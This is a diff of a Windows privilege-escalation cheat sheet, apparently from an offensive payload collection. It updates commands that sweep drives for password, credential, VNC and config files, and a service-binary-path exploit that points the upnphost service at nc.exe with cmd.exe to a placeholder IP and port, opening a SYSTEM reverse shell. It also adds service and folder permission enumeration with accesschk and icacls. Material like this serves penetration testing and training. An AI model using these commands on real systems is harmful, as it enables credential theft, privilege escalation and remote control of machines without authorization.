@@ -253,7 +253,6 @@ dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 
-findstr /si password *.xml *.ini *.txt *.config 2>nul
 Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
 ```
 
@@ -261,10 +260,11 @@ Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction Sil
 
 ```bat
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
-findstr /si password *.xml *.ini *.txt *.config
-findstr /spin "password" *.*
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+findstr /spin "password" *.* 2>nul
 
-dir /s *pass* == *vnc* == *.config* 2>nul
+dir /s *pass* == *vnc* == *.config* 2>nul (lot of output)
+
 Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
 
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
@@ -334,9 +334,13 @@ Write-ServiceBinary
 
 ### Manual exploit Binary Path
 
+Tested on Windows XP SP1
+
 ```bat
 sc qc upnphost
-sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+sc config SSDPSRV start= auto
+net start SSDPSRV
+sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
 net start upnphost
@@ -445,16 +449,25 @@ icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
 icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
 icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
 
+cacls "c:\Program Files" /T | findstr Users
+
 accesschk.exe -uwcqv "Everyone" * -accepteula
 accesschk.exe -uwcqv "Authenticated Users" *
 accesschk.exe -uwcqv "Users" *
 accesschk.exe -ucqv *
 accesschk.exe -ucqv Spooler
+
+
+
 ```
+For Windows XP and 2003, use an older version of accesschk
+
+- [Accesschk-2003-xp.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
 
 Interesting permissions to get shell
 
 ```bat
+SERVICE_ALL_ACCESS (full access)
 SERVICE_CHANGE_CONFIG (reconfigure binary)
 WRITE_DAC (reconfigure permissions)
 WRITE_OWNER (become owner, change permission)
